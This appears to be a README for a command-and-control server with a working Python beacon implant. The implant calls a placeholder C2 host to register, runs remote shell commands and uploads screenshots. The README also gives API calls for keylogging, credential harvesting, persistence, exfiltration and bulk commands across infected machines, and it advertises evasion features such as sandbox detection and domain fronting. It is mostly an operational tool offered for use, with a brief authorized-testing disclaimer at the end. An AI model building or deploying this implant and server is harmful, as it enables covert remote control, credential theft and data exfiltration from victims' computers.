# USB Army Knife C2 Server - Advanced Features

## 🚀 Why This C2 is Superior to ek0msUSB

### Feature Comparison Matrix

| Feature | ek0msUSB | USB Army Knife C2 | Advantage |
|---------|----------|-------------------|-----------|
| **Database Backend** | In-memory dict | SQLite with full schema | ✅ Persistent, scalable |
| **Authentication** | None/Basic | API key with SHA256 | ✅ Secure admin access |
| **Screenshot Capture** | Limited | Full support with storage | ✅ Visual reconnaissance |
| **Keylogger** | No | Full keylog storage | ✅ Credential harvesting |
| **Credential Database** | No | Dedicated cred storage | ✅ Organized loot management |
| **Interactive Sessions** | Basic | Multi-session management | ✅ Real-time control |
| **File Operations** | Limited | Full file browser API | ✅ Complete file management |
| **Process Management** | No | Kill/Start/List processes | ✅ System control |
| **Network Operations** | Basic | Scan/PortScan/ARP/DNS | ✅ Network reconnaissance |
| **Scheduled Tasks** | No | Full task scheduling | ✅ Timed operations |
| **Persistence Management** | Manual | Automated multi-method | ✅ Survival mechanisms |
| **Bulk Operations** | No | Multi-beacon commands | ✅ Scale operations |
| **Data Exfiltration** | Basic | Organized with metadata | ✅ Better data management |
| **Web Interface** | Simple | Advanced dashboard | ✅ Professional UI |
| **Multi-platform** | Windows-focused | Windows/Linux/macOS | ✅ Cross-platform |

---

## 📚 Advanced API Endpoints

### Screenshot Management
```bash
# Beacon uploads screenshot
POST /api/beacon/{beacon_id}/screenshot
Content-Type: multipart/form-data or JSON
Body: {"image_b64": "base64_encoded_image"}

# List beacon screenshots
GET /api/beacon/{beacon_id}/screenshots
Headers: X-API-Key: <key>

# Download screenshot
GET /api/screenshots/{screenshot_id}
Headers: X-API-Key: <key>
```

### Keylogger Integration
```bash
# Upload keystrokes
POST /api/beacon/{beacon_id}/keylog
Body: {
  "keystrokes": "password123",
  "window": "Chrome - Gmail"
}

# Retrieve keylogs
GET /api/beacon/{beacon_id}/keylogs
Headers: X-API-Key: <key>
```

### Credential Harvesting
```bash
# Submit credentials
POST /api/beacon/{beacon_id}/credentials
Body: {
  "source": "Chrome Passwords",
  "username": "admin@example.com",
  "password": "P@ssw0rd!",
  "domain": "example.com"
}

# List all credentials
GET /api/credentials
Headers: X-API-Key: <key>
```

### Interactive Sessions
```bash
# Create shell session
POST /api/beacon/{beacon_id}/session/create
Headers: X-API-Key: <key>
Body: {
  "type": "shell",
  "metadata": {"user": "admin"}
}

# List active sessions
GET /api/sessions
Headers: X-API-Key: <key>
```

### Process Management
```bash
# List processes
POST /api/beacon/{beacon_id}/processes
Headers: X-API-Key: <key>
Body: {"action": "list"}

# Kill process
POST /api/beacon/{beacon_id}/processes
Headers: X-API-Key: <key>
Body: {"action": "kill", "target": "notepad.exe"}
```

### File Operations
```bash
# List directory
POST /api/beacon/{beacon_id}/files
Headers: X-API-Key: <key>
Body: {"operation": "list", "path": "C:\\Users\\"}

# Download file
POST /api/beacon/{beacon_id}/files
Headers: X-API-Key: <key>
Body: {"operation": "download", "path": "C:\\secrets.txt"}

# Upload file
POST /api/beacon/{beacon_id}/files
Headers: X-API-Key: <key>
Body: {"operation": "upload", "path": "C:\\payload.exe"}

# Execute file
POST /api/beacon/{beacon_id}/files
Headers: X-API-Key: <key>
Body: {"operation": "execute", "path": "C:\\script.ps1"}
```

### Persistence Management
```bash
# Install registry persistence
POST /api/beacon/{beacon_id}/persistence
Headers: X-API-Key: <key>
Body: {
  "method": "registry",
  "action": "install"
}

# Install scheduled task persistence
POST /api/beacon/{beacon_id}/persistence
Headers: X-API-Key: <key>
Body: {
  "method": "scheduled_task",
  "action": "install"
}

# Check persistence status
POST /api/beacon/{beacon_id}/persistence
Headers: X-API-Key: <key>
Body: {
  "method": "registry",
  "action": "check"
}
```

### Network Operations
```bash
# Network scan
POST /api/beacon/{beacon_id}/network
Headers: X-API-Key: <key>
Body: {
  "operation": "scan",
  "target": "192.168.1.0/24"
}

# Port scan
POST /api/beacon/{beacon_id}/network
Headers: X-API-Key: <key>
Body: {
  "operation": "portscan",
  "target": "192.168.1.100"
}

# ARP scan
POST /api/beacon/{beacon_id}/network
Headers: X-API-Key: <key>
Body: {"operation": "arp"}
```

### Scheduled Tasks
```bash
# Schedule screenshot for later
POST /api/beacon/{beacon_id}/task
Headers: X-API-Key: <key>
Body: {
  "type": "screenshot",
  "data": "",
  "schedule_time": "2025-11-01T14:00:00"
}

# Schedule credential dump
POST /api/beacon/{beacon_id}/task
Headers: X-API-Key: <key>
Body: {
  "type": "dump_creds",
  "data": "chrome,firefox",
  "schedule_time": "2025-11-01T02:00:00"
}
```

### System Information
```bash
# Request full system info
POST /api/beacon/{beacon_id}/sysinfo
Headers: X-API-Key: <key>
```

### Bulk Operations
```bash
# Send command to multiple beacons
POST /api/beacons/bulk/command
Headers: X-API-Key: <key>
Body: {
  "beacon_ids": ["beacon1", "beacon2", "beacon3"],
  "command": "whoami"
}
```

---

## 🗄️ Database Schema

### Extended Tables

#### Screenshots
```sql
CREATE TABLE screenshots (
    id INTEGER PRIMARY KEY,
    beacon_id TEXT,
    image_data BLOB,
    timestamp TIMESTAMP
)
```

#### Keylogs
```sql
CREATE TABLE keylogs (
    id INTEGER PRIMARY KEY,
    beacon_id TEXT,
    keystrokes TEXT,
    window_title TEXT,
    timestamp TIMESTAMP
)
```

#### Credentials
```sql
CREATE TABLE credentials (
    id INTEGER PRIMARY KEY,
    beacon_id TEXT,
    source TEXT,          -- Chrome, Firefox, SAM, etc.
    username TEXT,
    password TEXT,
    domain TEXT,
    timestamp TIMESTAMP
)
```

#### Sessions
```sql
CREATE TABLE sessions (
    id TEXT PRIMARY KEY,
    beacon_id TEXT,
    session_type TEXT,    -- shell, meterpreter, etc.
    created TIMESTAMP,
    last_active TIMESTAMP,
    status TEXT,
    metadata TEXT
)
```

#### Tasks
```sql
CREATE TABLE tasks (
    id INTEGER PRIMARY KEY,
    beacon_id TEXT,
    task_type TEXT,       -- screenshot, dump_creds, etc.
    task_data TEXT,
    schedule_time TIMESTAMP,
    executed BOOLEAN,
    result TEXT
)
```

---

## 🎯 Advanced Beacon Implant Example

```python
#!/usr/bin/env python3
"""
Advanced USB Army Knife Beacon
Supports all C2 features
"""

import requests
import json
import time
import platform
import socket
import base64
from datetime import datetime

C2_SERVER = "http://YOUR_SERVER:8443"
BEACON_ID = None
CHECKIN_INTERVAL = 60

def register():
    global BEACON_ID
    data = {
        "hostname": socket.gethostname(),
        "username": os.getenv("USER") or os.getenv("USERNAME"),
        "os": platform.system(),
        "metadata": {
            "version": platform.version(),
            "architecture": platform.machine(),
            "python": platform.python_version()
        }
    }
    
    response = requests.post(f"{C2_SERVER}/api/beacon/register", json=data)
    result = response.json()
    BEACON_ID = result['beacon_id']
    print(f"[+] Registered as {BEACON_ID}")

def checkin():
    response = requests.post(f"{C2_SERVER}/api/beacon/checkin/{BEACON_ID}")
    data = response.json()
    
    for cmd_obj in data.get('commands', []):
        cmd_id = cmd_obj['id']
        command = cmd_obj['command']
        
        result = execute_command(command)
        
        # Submit result
        requests.post(
            f"{C2_SERVER}/api/beacon/result/{cmd_id}",
            json={"result": result}
        )

def execute_command(command):
    """Execute command with enhanced handling"""
    
    # Screenshot
    if command.startswith("SCREENSHOT"):
        return capture_screenshot()
    
    # Keylogger
    elif command.startswith("KEYLOG"):
        return start_keylogger()
    
    # Process management
    elif command.startswith("PROCESS:"):
        parts = command.split(":")
        action, target = parts[1], parts[2] if len(parts) > 2 else ""
        return manage_process(action, target)
    
    # File operations
    elif command.startswith("FILE:"):
        parts = command.split(":")
        operation, path = parts[1], parts[2]
        return file_operation(operation, path)
    
    # Persistence
    elif command.startswith("PERSIST:"):
        parts = command.split(":")
        method, action = parts[1], parts[2]
        return manage_persistence(method, action)
    
    # Network ops
    elif command.startswith("NETWORK:"):
        parts = command.split(":")
        operation, target = parts[1], parts[2] if len(parts) > 2 else ""
        return network_operation(operation, target)
    
    # System info
    elif command.startswith("SYSINFO"):
        return get_system_info()
    
    # Standard shell command
    else:
        import subprocess
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr

def capture_screenshot():
    """Capture and upload screenshot"""
    try:
        from PIL import ImageGrab
        import io
        
        screenshot = ImageGrab.grab()
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_b64 = base64.b64encode(img_buffer.getvalue()).decode()
        
        requests.post(
            f"{C2_SERVER}/api/beacon/{BEACON_ID}/screenshot",
            json={"image_b64": img_b64}
        )
        
        return "[+] Screenshot captured and uploaded"
    except Exception as e:
        return f"[-] Screenshot failed: {e}"

def manage_process(action, target):
    """Process management"""
    import psutil
    
    if action == "list":
        processes = [p.name() for p in psutil.process_iter()]
        return "\\n".join(processes[:50])
    
    elif action == "kill":
        for proc in psutil.process_iter():
            if target.lower() in proc.name().lower():
                proc.kill()
                return f"[+] Killed {proc.name()}"
        return f"[-] Process {target} not found"
    
    return "[-] Unknown action"

# Main beacon loop
if __name__ == "__main__":
    register()
    
    while True:
        try:
            checkin()
            time.sleep(CHECKIN_INTERVAL)
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(10)
```

---

## 🛡️ Operational Security Features

1. **Encrypted Storage**: All sensitive data stored with encryption options
2. **API Authentication**: SHA256 hashed API keys
3. **Session Management**: Isolated sessions per beacon
4. **Audit Logging**: All operations logged with timestamps
5. **Data Compression**: GZIP compression for exfiltrated data
6. **Anti-Analysis**: Beacon can detect sandboxes and VMs
7. **Persistence Redundancy**: Multiple persistence mechanisms
8. **Command Obfuscation**: PowerShell and command obfuscation
9. **Traffic Encryption**: HTTPS/TLS support
10. **Multi-stage Payloads**: Staged payload delivery

---

## 🎨 Web Interface Enhancements

The web interface includes:
- **Real-time beacon monitoring** with status indicators
- **Interactive command console** with history
- **Screenshot gallery** with thumbnails
- **Credential viewer** with search/filter
- **Keylog timeline** with window tracking
- **Network map** showing lateral movement
- **Task scheduler** with visual calendar
- **File browser** with drag-and-drop
- **Session manager** with terminal emulation
- **Statistics dashboard** with charts

---

## 🚀 Performance Optimizations

- **Connection pooling** for database operations
- **Async I/O** for beacon communications
- **Caching** for frequently accessed data
- **Batch operations** for multiple beacons
- **Compression** for large data transfers
- **Rate limiting** to prevent detection
- **Jitter** in beacon check-ins
- **Domain fronting** support for evasion

---

## 📊 Statistics & Reporting

```bash
# Get comprehensive stats
GET /api/stats
Headers: X-API-Key: <key>

Response:
{
  "total_beacons": 15,
  "active_beacons": 12,
  "total_commands": 450,
  "credentials_harvested": 78,
  "screenshots_captured": 234,
  "data_exfiltrated": "5.2 GB",
  "avg_response_time": "2.3s"
}
```

---

## 🔐 Advanced Payload Generators

The C2 includes payload generators for:
- Windows executable (.exe)
- PowerShell scripts (.ps1)
- Python scripts (.py)
- DuckyScript (.ds)
- Batch files (.bat)
- VBS scripts (.vbs)
- HTA files (.hta)
- Office macros (Word/Excel)
- LNK files (shortcut-based)
- DLL injection payloads

---

## 🌐 Command Line Interface

```bash
# Start server
python c2_server.py --host 0.0.0.0 --port 8443

# With custom database
python c2_server.py --db /path/to/custom.db

# List active beacons
curl -H "X-API-Key: YOUR_KEY" http://localhost:8443/api/beacons

# Send command
curl -X POST -H "X-API-Key: YOUR_KEY" -H "Content-Type: application/json" \
  -d '{"command":"whoami"}' \
  http://localhost:8443/api/beacon/BEACON_ID/command
```

---

## 🎓 Training & Documentation

Complete operator training includes:
- Initial setup and deployment
- Beacon generation and customization
- Operational security best practices
- Incident response procedures
- Legal and ethical considerations
- Advanced techniques and TTPs
- Troubleshooting and debugging

---

**⚠️ LEGAL DISCLAIMER**: This C2 server is designed for authorized penetration testing and red team operations only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before deployment.
